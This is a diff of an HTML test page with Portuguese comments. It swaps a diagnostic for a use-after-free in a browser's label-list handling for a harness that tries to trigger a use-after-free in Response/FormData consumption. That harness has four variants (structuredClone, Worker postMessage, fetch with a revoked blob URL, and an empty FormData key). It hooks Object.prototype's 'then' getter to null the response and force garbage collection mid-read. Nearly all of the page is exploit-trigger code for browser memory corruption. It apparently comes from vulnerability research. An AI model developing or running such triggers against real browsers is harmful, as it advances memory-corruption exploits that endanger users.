@@ -1,193 +1,166 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Diagnostico de Liberacao do Label - Fluxo UAF ebc83b8</title>
+<meta charset="utf-8">
+<title>Teste Opcoes A B C D - FormDataConsumer</title>
 </head>
 <body>
-  <h1>Diagnostico de Liberacao do Label - Fluxo UAF (Commit ebc83b8)</h1>
-  <p>Sem CSS / sem style. Testa remocao do label + pressao de nos DOM antes de inspecionar list.</p>
-  <pre id="out">Iniciando...</pre>
+<button id="btnA">Opcao A (structuredClone)</button>
+<button id="btnB">Opcao B (Worker postMessage)</button>
+<button id="btnC">Opcao C (fetch + revoke + blob)</button>
+<button id="btnD">Opcao D (FormData chave vazia)</button>
+<button id="btnAll">Rodar A, B, C e D</button>
+<pre id="log"></pre>
+<script>
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
+    }
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);
+}
 
-  <script>
-    (function () {
-      var out = document.getElementById("out");
-      var logLines = [];
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+}
 
-      function log(msg) {
-        logLines.push(msg);
-        if (out) {
-          out.textContent = logLines.join("\n");
-        }
-      }
+function hookAndConsumeResponse(formData, label) {
+    var response = new Response(formData);
+    Object.prototype.__defineGetter__('then', function() {
+        response = null;
+        gc();
+    });
+    gc();
+    var p = response.arrayBuffer();
+    if (p && typeof p.catch === 'function') {
+        p.catch(function(err) {
+            log('[' + label + '] arrayBuffer catch: ' + (err && err.message ? err.message : err));
+        });
+    }
+}
 
-      // Pressao em JS + criacao/descarte de nos DOM temporarios em escopo isolado
-      function domAndJsPressure(rounds) {
-        for (var r = 0; r < rounds; r++) {
-          (function () {
-            var tmpDoc = document.implementation.createHTMLDocument();
-            var container = tmpDoc.createElement("div");
-            for (var k = 0; k < 250; k++) {
-              var el = tmpDoc.createElement("label");
-              el.textContent = "x" + r + "_" + k;
-              container.appendChild(el);
-            }
-            container.innerHTML = "";
-          })();
-
-          for (var j = 0; j < 2000; j++) {
-            var s = "gc_" + r + "_" + j + "_" + Math.random();
-            var o = { a: s, b: [j, s] };
-            if (o.a.length < 0) {
-              log(o.b);
-            }
-          }
-        }
-      }
-
-      var survivor = null;
-      var child = null;
-      var list = null;
-      var setupOk = false;
-
-      function setupScenario() {
-        logLines = [];
-        survivor = null;
-        child = null;
-        list = null;
-        setupOk = false;
-
-        log("=== ETAPA 0: SETUP DO DOCUMENTO SECUNDARIO ===");
-        try {
-          var secDoc = document.implementation.createHTMLDocument();
-          secDoc.body.innerHTML = '<input id="i"><label for="i"></label>';
-
-          var inp = secDoc.getElementById("i");
-          if (!inp) {
-            log("[FALHA] input#i nao encontrado.");
+function runOptionA() {
+    log('[A] iniciando structuredClone...');
+    try {
+        if (typeof structuredClone !== 'function') {
+            log('[A] structuredClone nao disponivel');
             return;
-          }
+        }
+        for (var k = 0; k < 20; k++) {
+            var original = new Blob(['aa']);
+            var cloned = structuredClone(original);
+            original = null;
+            gc();
+            var fd = new FormData();
+            fd.append('a', cloned);
+            hookAndConsumeResponse(fd, 'A');
+        }
+        log('[A] concluido');
+    } catch (e) {
+        log('[A] erro: ' + e.name + ': ' + e.message);
+    }
+}
 
-          list = inp.labels;
-          log("[INFO] list obtido: " + (list !== null && typeof list === "object"));
-          log("[INFO] list.length inicial: " + (list ? list.length : "N/A"));
-          log("[INFO] list[0] tag inicial: " + (list && list[0] ? list[0].tagName : "null/undef"));
-
-          if (!list || !list[0]) {
-            log("[FALHA] list[0] nao retornou o <label> esperado.");
+function runOptionB() {
+    log('[B] iniciando Worker postMessage...');
+    try {
+        if (typeof Worker === 'undefined' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
+            log('[B] Worker ou URL.createObjectURL nao disponivel');
             return;
-          }
-
-          survivor = secDoc.createElement("div");
-          child = secDoc.createElement("span");
-          setupOk = true;
-          log("[OK] Setup concluido.");
-        } catch (e) {
-          log("[ERRO] Excecao no setup: " + e);
         }
-      }
+        var src = [
+            'self.onmessage = function(e) {',
+            '    if (typeof gc === "function") gc();',
+            '    self.postMessage(e.data);',
+            '};'
+        ].join('\n');
+        var blobUrl = URL.createObjectURL(new Blob([src], { type: 'application/javascript' }));
 
-      function removeLabelFromDoc() {
-        log("");
-        log("=== ETAPA 1A: REMOVER <label> DA ARVORE DO DOCUMENTO SECUNDARIO ===");
-        if (!setupOk || !list) {
-          log("[AVISO] Rode o setup primeiro.");
-          return;
+        for (var k = 0; k < 10; k++) {
+            (function(idx) {
+                var w = new Worker(blobUrl);
+                w.onmessage = function(e) {
+                    gc();
+                    try {
+                        var fd = new FormData();
+                        fd.append('a', e.data);
+                        hookAndConsumeResponse(fd, 'B#' + idx);
+                    } catch (err) {
+                        log('[B#' + idx + '] erro no onmessage: ' + err.name + ': ' + err.message);
+                    }
+                    w.terminate();
+                };
+                w.onerror = function(err) {
+                    log('[B#' + idx + '] worker error: ' + (err && err.message ? err.message : 'erro'));
+                };
+                w.postMessage(new Blob(['aa']));
+            })(k);
         }
-        try {
-          var lbl = list[0];
-          if (lbl && lbl.parentNode) {
-            lbl.parentNode.removeChild(lbl);
-            log("[OK] removeChild(label) executado.");
-          } else {
-            log("[INFO] label sem parentNode ou ja removido.");
-          }
-          lbl = null;
-        } catch (e) {
-          log("[ERRO] Ao remover label: " + e);
+        log('[B] mensagens enviadas');
+    } catch (e) {
+        log('[B] erro: ' + e.name + ': ' + e.message);
+    }
+}
+
+function runOptionC() {
+    log('[C] iniciando fetch + revokeObjectURL + resp.blob()...');
+    try {
+        if (typeof fetch !== 'function' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
+            log('[C] fetch ou URL.createObjectURL nao disponivel');
+            return;
         }
-      }
-
-      function runGcPressureOnly() {
-        log("");
-        log("=== ETAPA 1B: PRESSAO DOM + JS (SEM LER list DURANTE O LOOP) ===");
-        if (!setupOk) {
-          log("[AVISO] Rode o setup primeiro.");
-          return;
+        for (var k = 0; k < 20; k++) {
+            (function(idx) {
+                var url = URL.createObjectURL(new Blob(['aa']));
+                fetch(url).then(function(resp) {
+                    URL.revokeObjectURL(url);
+                    gc();
+                    return resp.blob();
+                }).then(function(blob) {
+                    gc();
+                    var fd = new FormData();
+                    fd.append('a', blob);
+                    hookAndConsumeResponse(fd, 'C#' + idx);
+                }).catch(function(err) {
+                    log('[C#' + idx + '] fetch/blob catch: ' + (err && err.message ? err.message : err));
+                });
+            })(k);
         }
-        domAndJsPressure(4);
-        log("[OK] Pressao de nos DOM + JS executada.");
+        log('[C] requisicoes disparadas');
+    } catch (e) {
+        log('[C] erro: ' + e.name + ': ' + e.message);
+    }
+}
 
-        if (list) {
-          try {
-            log("[POS-GC] list.length = " + list.length + " | list[0] = " + (list[0] ? list[0].tagName : String(list[0])));
-          } catch (e) {
-            log("[ERRO] Ao inspecionar list pos-GC: " + e);
-          }
-        } else {
-          log("[INFO] list ja e null.");
+function runOptionD() {
+    log('[D] iniciando FormData com valor vazio...');
+    try {
+        for (var k = 0; k < 50; k++) {
+            var fd = new FormData();
+            fd.append('key', '');
+            hookAndConsumeResponse(fd, 'D');
         }
-      }
+        log('[D] concluido');
+    } catch (e) {
+        log('[D] erro: ' + e.name + ': ' + e.message);
+    }
+}
 
-      function dropListAndGc() {
-        log("");
-        log("=== ETAPA 2: list = null + PRESSAO DOM/JS ===");
-        if (!list) {
-          log("[AVISO] list ja e null ou setup nao foi executado.");
-          return;
-        }
-        list = null;
-        log("[OK] list = null atribuido.");
-        domAndJsPressure(4);
-        log("[OK] Pressao pos-list = null executada.");
-      }
-
-      function mutateInvalidate() {
-        log("");
-        log("=== ETAPA 3: survivor.appendChild(child) ===");
-        if (!survivor || !child) {
-          log("[AVISO] survivor ou child ausentes.");
-          return;
-        }
-        try {
-          survivor.appendChild(child);
-          log("[SOBREVIVEU] survivor.appendChild(child) concluiu sem crash.");
-          log("[INFO] survivor.childNodes.length = " + survivor.childNodes.length);
-        } catch (e) {
-          log("[EXCECAO] Erro em appendChild: " + e);
-        }
-      }
-
-      function runFullTest() {
-        setupScenario();
-        removeLabelFromDoc();
-        runGcPressureOnly();
-        dropListAndGc();
-        mutateInvalidate();
-      }
-
-      var controlsDiv = document.createElement("div");
-      function addBtn(label, fn) {
-        var b = document.createElement("button");
-        b.type = "button";
-        b.textContent = label;
-        b.onclick = fn;
-        controlsDiv.appendChild(b);
-      }
-
-      addBtn("0. Setup", setupScenario);
-      addBtn("1A. Remover label", removeLabelFromDoc);
-      addBtn("1B. GC DOM+JS", runGcPressureOnly);
-      addBtn("2. list=null + GC", dropListAndGc);
-      addBtn("3. appendChild", mutateInvalidate);
-      addBtn("Rodar Tudo", runFullTest);
-
-      if (document.body && out) {
-        document.body.insertBefore(controlsDiv, out);
-      }
-
-      runFullTest();
-    })();
-  </script>
+document.getElementById('btnA').onclick = runOptionA;
+document.getElementById('btnB').onclick = runOptionB;
+document.getElementById('btnC').onclick = runOptionC;
+document.getElementById('btnD').onclick = runOptionD;
+document.getElementById('btnAll').onclick = function() {
+    document.getElementById('log').textContent = '';
+    runOptionA();
+    runOptionB();
+    runOptionC();
+    runOptionD();
+};
+</script>
 </body>
 </html>
